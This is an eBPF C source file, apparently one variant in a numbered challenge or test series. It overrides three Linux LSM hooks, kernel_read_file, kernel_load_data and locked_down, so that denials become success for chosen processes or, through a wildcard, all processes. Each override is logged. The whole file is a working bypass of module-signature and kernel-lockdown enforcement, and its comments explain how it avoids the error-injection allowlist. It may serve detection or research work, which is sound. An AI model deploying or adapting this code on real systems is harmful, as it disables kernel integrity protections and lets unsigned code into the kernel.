// ch12 Signed-Driver Swap — REAL mutation variant via BPF LSM fmod_ret.
//
// Sibling to ch12-signed-driver-swap (observer: kprobes on load_module,
// module_sig_check, mod_verify_sig). On a kernel with CONFIG_BPF_LSM=y
// and `lsm=bpf,...` in the boot cmdline, this program overrides three
// LSM hooks in the module-load path:
//
//   security_kernel_read_file  — gate for file-backed kernel reads
//                                (kernel modules, firmware, kexec, etc.)
//   security_kernel_load_data  — gate for buffer-backed kernel loads
//   security_locked_down       — gate for features disabled by lockdown
//
// Each hook is fmod_ret -> 0 for targeted tgids (wildcard supported).
//
// LSM fmod_ret is the first-class override primitive: unlike kprobe +
// bpf_override_return, it is not gated by the error_injection allowlist.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define HOOK_KERNEL_READ_FILE 1
#define HOOK_KERNEL_LOAD_DATA 2
#define HOOK_LOCKED_DOWN      3

#define HOOK_NAME_LEN 24

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    int hook;
    int orig_ret;
    int flipped;
    char hook_name[HOOK_NAME_LEN];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

// Key 0 == wildcard ("flip denials for every tgid").
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1024);
} target_tgids SEC(".maps");

static __always_inline int is_target_tgid(void)
{
    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    unsigned int *hit = bpf_map_lookup_elem(&target_tgids, &tgid);
    unsigned int zero = 0;
    return (hit || bpf_map_lookup_elem(&target_tgids, &zero)) ? 1 : 0;
}

static __always_inline void emit_named(int hook, const char name[HOOK_NAME_LEN],
                                       int ret, int flipped)
{
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return;
    unsigned long id = bpf_get_current_pid_tgid();
    e->pid = id & 0xffffffff;
    e->tgid = id >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    e->hook = hook;
    e->orig_ret = ret;
    e->flipped = flipped;
    __builtin_memcpy(e->hook_name, name, HOOK_NAME_LEN);
    bpf_ringbuf_submit(e, 0);
}

// Per-hook name constants, NUL-padded to HOOK_NAME_LEN.
static const char NAME_KRF[HOOK_NAME_LEN] = "kernel_read_file";
static const char NAME_KLD[HOOK_NAME_LEN] = "kernel_load_data";
static const char NAME_LKD[HOOK_NAME_LEN] = "locked_down";

// security_kernel_read_file(struct file *file,
//                           enum kernel_read_file_id id, bool contents)
SEC("lsm.s/kernel_read_file")
int BPF_PROG(lsm_kernel_read_file,
             struct file *file,
             unsigned int id,
             bool contents,
             int ret)
{
    (void)file; (void)id; (void)contents;
    int flipped = 0;
    int new_ret = ret;
    if (is_target_tgid() && ret != 0) {
        new_ret = 0;
        flipped = 1;
    }
    emit_named(HOOK_KERNEL_READ_FILE, NAME_KRF, ret, flipped);
    return new_ret;
}

// security_kernel_load_data(enum kernel_load_data_id id, bool contents)
SEC("lsm.s/kernel_load_data")
int BPF_PROG(lsm_kernel_load_data,
             unsigned int id,
             bool contents,
             int ret)
{
    (void)id; (void)contents;
    int flipped = 0;
    int new_ret = ret;
    if (is_target_tgid() && ret != 0) {
        new_ret = 0;
        flipped = 1;
    }
    emit_named(HOOK_KERNEL_LOAD_DATA, NAME_KLD, ret, flipped);
    return new_ret;
}

// security_locked_down(enum lockdown_reason what)
SEC("lsm.s/locked_down")
int BPF_PROG(lsm_locked_down,
             unsigned int what,
             int ret)
{
    (void)what;
    int flipped = 0;
    int new_ret = ret;
    if (is_target_tgid() && ret != 0) {
        new_ret = 0;
        flipped = 1;
    }
    emit_named(HOOK_LOCKED_DOWN, NAME_LKD, ret, flipped);
    return new_ret;
}
